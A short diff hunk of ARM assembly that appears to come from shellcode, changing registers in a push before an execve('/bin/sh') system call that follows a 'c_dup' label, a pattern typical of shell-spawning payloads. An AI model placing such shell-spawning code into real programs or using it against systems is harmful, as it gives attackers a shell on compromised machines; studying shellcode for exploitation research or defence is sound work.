@@ -52,7 +52,7 @@ c_dup:
 
     // execve("/bin/sh", NULL, NULL);
     mov    r7, r2
-    push   {r9, r10, r7}
+    push   {r5, r6, r7}
     mov    r0, sp  
     mov    r7, #11       // r7 = execve
     svc    1
